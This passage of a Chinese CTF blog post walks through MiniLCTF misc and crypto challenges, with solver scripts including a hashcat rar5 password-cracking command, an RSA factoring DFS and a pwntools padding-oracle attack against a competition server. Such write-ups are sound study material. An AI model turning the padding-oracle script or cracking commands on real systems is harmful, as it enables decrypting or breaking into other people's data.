class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>一开始只解上半部分的时候发现解到一半GG了…看下print的东西好像逆过来就能解了..emm再看看题目中说她是兔子.想到斐波那契..干把..倒过来试…可以！ 但是后面还是GG了 因为无等号  那就拖出来继续自己解  手撕…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV'</span></span><br><span class="line">s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">s = (base64.b64decode(s))</span><br><span class="line">s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">s = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>flag:<code>MiniLCTF{5o_m@ny_Inn3r5p4ce_hs!!}</code></p>
<h2 id="抓猫猫-dbt-done"><a href="#抓猫猫-dbt-done" class="headerlink" title="抓猫猫 | dbt | done"></a>抓猫猫 | dbt | done</h2><p>nc…发现你输了很多次都是他能赢..为什么呢…因为只要他抓了之后剩下的是偶数你必然输，那其实如果比他小的话你是必然输的  那就瞎试试看？<br>从1开始 一接收到他的是偶数 断开重连，继续…到4之后。欸他给了个3nice<br>那就手输1 xswl<br>出了<br>flag:<code>miniL{c6d5bfc0-c92e-4d05-9d08-724667ee5900}</code>!</p>
<h2 id="好康的硬盘-CyXq-hs-done"><a href="#好康的硬盘-CyXq-hs-done" class="headerlink" title="好康的硬盘 | CyXq&hs | done"></a>好康的硬盘 | CyXq&amp;hs | done</h2><p>晚上做完了Web3，寻思去看看Misc3，从来没做过取证，呜呜呜，下载下来是一个名字为zip的文件，010打开，看到zip文件头<code>50 4B 03 04</code>，显然需要修改文件后缀名，然后解压得到了<code>flag.txt</code>和一个<code>rar</code>，binwalk，foremost啥也没搞出来，NTFS隐写也是啥也没有，没思路了，所以第一天晚上这题咕了。第二天起来，上午试了无数的方法都解不出来压缩包，也搞不懂<code>flag.txt</code>咋回事，直到下午伟大的树神告诉我<code>flag.txt</code>中可能有零宽字符隐写，即刻跑到羊羊师傅的博客搜一波，搜到了，然后学了一波。这里贴一下羊羊师傅的博客(<a target="_blank" rel="noopener" href="http://www.ga1axy.top/">http://www.ga1axy.top/</a>)<br>kali中vim打开<code>flag.txt</code>，看到<br><img src="https://md.wanan.world/uploads/upload_843f0cb7884cae5a5c173c6f19674b75.png"><br>yep!确实是零宽字符隐写，在线网站解就好，得到<code>minil****</code><br>这个应该就是<code>rar</code>压缩包的密码的一部分，手试了几次，全部以失败告终……<br>想着试着把<code>rar</code>拖进ARCHPR爆破提示文件格式解析不了，网上搜到说是ARCHPR爆破不了rar5，把题目的<code>rar</code>拖进010，看到文件头为<code>52 61 72 21 1A 07 01 00</code>,确实是rar5的文件头。去网上搜怎么爆破rar5的密码，查到可以用rar2john+hashcat，然后花了一下午装这俩工具，期间出现了无数的小问题，我是真的菜，但凡之前少嫖几次别人工具直接用，自己找几次，装个工具都不会这么费劲。<br>有工具了啥都好说，这里还要说羊羊师傅yyds，在羊羊师傅博客里以最快速度学会了怎么用hashcat爆破<br>kali，<code>rar2john flag.txt</code>得到rar压缩包的hash<br>windows，<code>./hashcat64.exe -m 13000 -a 3 '$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942' minil?a?a?a?a</code><br><img src="https://md.wanan.world/uploads/upload_3cb41e2a280eff86b961d3957471102b.png"><br>解压rar压缩包，img文件终于出来了，呜呜呜<br>搜到个能搞硬盘的工具(X-Ways Forensics),把img文件拖进去，用这东西也费了好多时间，因为属实没用过，不会用。 最后发现可以直接看分区目录，点了一下分区1……<br><img src="https://md.wanan.world/uploads/upload_c37c4b94f3b378fa6b6550f1a3477e41.png"><br>az，出来了，”好康的”，看了两遍视频挺有意思的，被开头吸引（bushi，然后树神看了一眼，让我把视频发给他，过了一会，给我发回来7张图片（hsyyds），得到的一串数字是:<code>7355608</code>（cs放C4输的，哈哈哈）<br>接下来应该就是最后一步了，从“奇怪的邮件”中找线索，利用这串数字解出flag！<br>这里想吐槽自己，为什么这么喜欢用微软的搜索引擎，搜了俩小时啥也没搜到，英语学弱被迫看了好几遍邮件内容，咋看都觉得<code>Senate bill 1621 ; Title 3 , Section 303 .</code>,<code>Senate bill 2116 , Title 9 , Section 309</code>,<code>Why work for somebody else when you can Why work for somebody else when you can become rich within 38 WEEKS !Why work for somebody else when you can become rich inside 59 days ! become rich within 81 days</code>这些等等没完没了重复的东西不对劲，可是就是搜不到，后来破罐子破摔，开梯子去谷歌搜了一下<code>Senate bill 2116 , Title 9 , Section 309</code>一下就搜到解密网站了，哎<br><img src="https://md.wanan.world/uploads/upload_24df2ff44a13271ca11496c0ed6125ad.png"><br>flag：<code>MiniLCTF{n3ver_g0nna_L3t_H5_dowN}</code></p>
<h2 id="Recombination-dbt-done"><a href="#Recombination-dbt-done" class="headerlink" title="Recombination | dbt | done"></a>Recombination | dbt | done</h2><p>rar伪加密对着文件头去修复，<br>打开一个文件 flag.txt，里面有很多很多数字..一开始看很有特点都是循环的，但是无果….转成二进制 看 转成十六进制看 都没办法 直接long_to_bytes，没东西…<br>甚至还想用XCTF 3rd-RCTF-2017的二进制形式去查看这道题…emmm还是没找到办法，都没用…<br>之后给了hint ： <code>你看过阿凡达吗?</code><br>找了很多很多，甚至思路去开始想…DNA基因Recombination相关的内容，还查了DNA基因库…无果…<br>然后又给了个hint：<code>3D</code><br>找了很久才知道有 <code>aa3d</code> 这个考点…甚至是我们拿了rank17的DasCTF的三月赛.离谱阿.没复现过.<br>找到这个writeup <a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a><br>看下去发现有aa3d的东西，但是他也是一组数.去了官网下了东西，但是没看懂，继续看发现他是把数字进行反色之后位移就能出东西..试一下..生成一组数之后发现前面都是相同的对的上的<br>长度是 4459 = 47 * 97 ，那就去格式一下，截个图。 然后去用stegosolve偏移图层发现flag出来了。一开始是比较不清晰的 问了Ga1@xy 之后说还不是最清晰的，让我在调调，在多调一下最后得到的是</p>
<p><img src="https://md.wanan.world/uploads/upload_225d88303a00c4d01853fcf85ae00f8a.png"></p>
<p>flag:<code>MiniL{A@3d-1s_Ar7!!}</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto:"></a><strong>Crypto:</strong></h1><h2 id="asr-dbt-done"><a href="#asr-dbt-done" class="headerlink" title="asr | dbt | done"></a>asr | dbt | done</h2><p>高低位一起dfs<br>(shallow之前的脚本拉出来改的 … 应该不会被发现吧 …x</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d =inverse(e,phi)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p_q</span>():</span><br><span class="line">    p_low = [<span class="number">0</span>]</span><br><span class="line">    q_high = [<span class="number">0</span>]</span><br><span class="line">    q_low = [<span class="number">0</span>]</span><br><span class="line">    p_high = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    si = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x_lowbits = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        n_lowbits = (n % maskn)</span><br><span class="line">        tmppp_low = []</span><br><span class="line">        tmpqq_low = []</span><br><span class="line">        tmppp_high =[]</span><br><span class="line">        tmpqq_high =[]</span><br><span class="line">        x_highbits = (x &gt;&gt; (<span class="number">511</span>-i)) &amp; <span class="number">1</span></span><br><span class="line">        n_highbits = (n)&gt;&gt; (<span class="number">1022</span> - <span class="number">2</span>*i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p_low)):</span><br><span class="line">            <span class="keyword">for</span> pp_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> qq_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> pp_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> qq_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> pp_low ^ qq_high == x_lowbits <span class="keyword">and</span> qq_low ^ pp_high == x_highbits:</span><br><span class="line">                                temp1 = ((pp_low * maskn //<span class="number">2</span> + p_low[j]) * (qq_low * maskn // <span class="number">2</span> + q_low[j])) % maskn </span><br><span class="line">                                temp2 = (((pp_high &lt;&lt; (<span class="number">511</span>-i)) + p_high[j]) * ((qq_high &lt;&lt; (<span class="number">511</span>-i)) + q_high[j]))&gt;&gt;(<span class="number">1022</span>-<span class="number">2</span>*i)</span><br><span class="line">                                <span class="keyword">if</span> temp1 == n_lowbits :</span><br><span class="line">                                    <span class="keyword">if</span> n_highbits-temp2 &gt;= <span class="number">0</span>  <span class="keyword">and</span> n_highbits-temp2 &lt;=(<span class="number">2</span>&lt;&lt;i+<span class="number">1</span>):</span><br><span class="line">                                        <span class="comment">#print("down")</span></span><br><span class="line">                                        tmppp_low.append(pp_low * maskn //<span class="number">2</span> + p_low[j])</span><br><span class="line">                                        tmpqq_low.append(qq_low * maskn //<span class="number">2</span> + q_low[j])</span><br><span class="line">                                        tmppp_high.append((pp_high&lt;&lt;(<span class="number">511</span>-i))+p_high[j])</span><br><span class="line">                                        tmpqq_high.append((qq_high&lt;&lt;(<span class="number">511</span>-i))+q_high[j])</span><br><span class="line">                                        <span class="comment">#print(tmppp_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_low)</span></span><br><span class="line">                                        <span class="comment">#print(tmppp_high)</span></span><br><span class="line">                                        <span class="comment">#print(tmpqq_high)</span></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        p_low = tmppp_low</span><br><span class="line">        q_low = tmpqq_low</span><br><span class="line">        p_high = tmppp_high</span><br><span class="line">        q_high = tmpqq_high</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="built_in">len</span>(p_low))</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p_low:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> p_high:</span><br><span class="line">            <span class="keyword">if</span> n %(a+b) ==<span class="number">0</span>:</span><br><span class="line">                p = a + b</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n//p</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = <span class="number">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line">    c = <span class="number">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    x = <span class="number">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </span><br><span class="line">    p , q = get_p_q()</span><br><span class="line">    flag = get_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>flag:<code>miniLCTF{reverse_1s_als0_e1sy_for_hs}</code></p>
<h2 id="standard-cbc-dbt-done"><a href="#standard-cbc-dbt-done" class="headerlink" title="standard cbc | dbt | done"></a>standard cbc | dbt | done</h2><p>原来那道题…想的是用base64去爆破大概的每位是啥…但是发现出的是32位哈希值 没法爆破，浪费了好一会时间…<br>Padding Oracle…细节真难调…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_least_length</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        guess = <span class="string">b'\x00'</span> * i</span><br><span class="line">        c = b64decode(get_recv(guess))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            base = <span class="built_in">len</span>(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(c) != base:</span><br><span class="line">            <span class="keyword">return</span> base - <span class="number">16</span> - i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_recv</span>(<span class="params">x</span>):</span><br><span class="line">    io.send(<span class="string">b'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.send(b64encode(x))</span><br><span class="line">    Res = io.recvuntil(<span class="string">b'flag;'</span>).decode().split(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> Res[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_message_last</span>(<span class="params">c</span>):</span><br><span class="line">    guess = long_to_bytes(<span class="number">66</span>) * <span class="number">239</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        G = guess + long_to_bytes(i)</span><br><span class="line">        io.send(<span class="string">b'2'</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">        io.send(b64encode(G + c))</span><br><span class="line">        io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">        io.send(b64encode(IV))</span><br><span class="line">        resp = io.recvuntil(<span class="string">'flag;'</span>).decode().split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> resp == <span class="string">''</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    IV = <span class="string">b'\x00'</span>*<span class="number">16</span></span><br><span class="line">    LengTh = <span class="number">0</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    M = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">    <span class="keyword">while</span> LengTh == <span class="literal">None</span> <span class="keyword">or</span> LengTh != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">'0.0.0.0'</span>, <span class="number">10001</span>)</span><br><span class="line">            io.recv()</span><br><span class="line">            LengTh = get_least_length()</span><br><span class="line">            <span class="built_in">print</span>(LengTh)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Get Length!!!'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        pad = <span class="string">b'\x76'</span> * <span class="number">16</span> + (<span class="number">15</span> - i) * <span class="string">b'\x00'</span></span><br><span class="line">        res = get_recv(pad)</span><br><span class="line">        ciphertext.append(b64decode(res))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Get Ciphertext!!!'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            c16 = c[<span class="number">48</span>:<span class="number">64</span>]</span><br><span class="line">            M[-<span class="number">1</span>] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">47</span>])</span><br><span class="line">        c16 = c[<span class="number">32</span>:<span class="number">48</span>]</span><br><span class="line">        M[i] = long_to_bytes(get_message_last(c16) ^ c[<span class="number">31</span>])</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    m = <span class="string">b''</span>.join(M)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'Get Message!!!'</span>)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(<span class="string">b'3'</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    io.send(b64encode(m))</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br><span class="line">    <span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure>


<h2 id="土-块-dbt-done"><a href="#土-块-dbt-done" class="headerlink" title="土 块 | dbt | done"></a>土 块 | dbt | done</h2><p>qubits…..量子计算学习….量子通信~ <a target="_blank" rel="noopener" href="https://qiskit.org/textbook/preface.html">https://qiskit.org/textbook/preface.html</a>  想了好久好久…看了好多知乎文章不如官方文档来的实在..就去熟悉内容吧…脑子糊了好久，都没想到这个 翻官方文档 复制让01输出01，10输出10 巧！台尼玛巧了！ 在和槐师傅去西电附中路上想出来的，果然不能一直对着电脑！学了好多东西…不知道能记得多少…确实挺有意思的…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">Rec = <span class="keyword">lambda</span>  :p.recv()</span><br><span class="line">Sen = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">RecUntil = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RecSen</span>(<span class="params">x</span>):</span><br><span class="line">    Rec()</span><br><span class="line">    Sen(x)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    p = remote(<span class="string">"pwn.woooo.tech"</span>,<span class="number">10185</span>)</span><br><span class="line">    RecSen(<span class="string">"lubenwei"</span>)</span><br><span class="line">    RecSen(<span class="string">"9"</span>)</span><br><span class="line">    RecSen(<span class="string">"1 0"</span>)</span><br><span class="line">    RecSen(<span class="string">"9"</span>)</span><br><span class="line">    RecSen(<span class="string">"0 1"</span>)</span><br><span class="line">    Sen(<span class="string">"0"</span>)</span><br><span class="line">    <span class="keyword">for</span>  i  <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        RecUntil(<span class="string">"is "</span>)</span><br><span class="line">        num = (p.recv(<span class="number">1</span>))</span><br><span class="line">        RecSen(<span class="built_in">str</span>(<span class="built_in">int</span>(num.decode())))</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(p.recvline()[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by deebato, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/ctf/" class="tag">#ctf</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/MRCTF2021WP/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">WriteUps of MRCTF2021(Crypto)</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/HFCTF2021Crypto/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">WriteUps of HFCTF2021(part crypto)</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/something" class="item">Something</a>
                
                <a href="/about" class="item">About</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/D33BaT0" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://twitter.com/De3bato" class="item">Twitter</a>
                
                <a target="_blank" rel="noopener" href="https://space.bilibili.com/324843873" class="item">Bilibili</a>
                
                <a href="mailto:2546664446@qq.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 deebato<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        <br>
        <span class="footer-extra-description">Life is a struggle,but you can fight against it...</span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>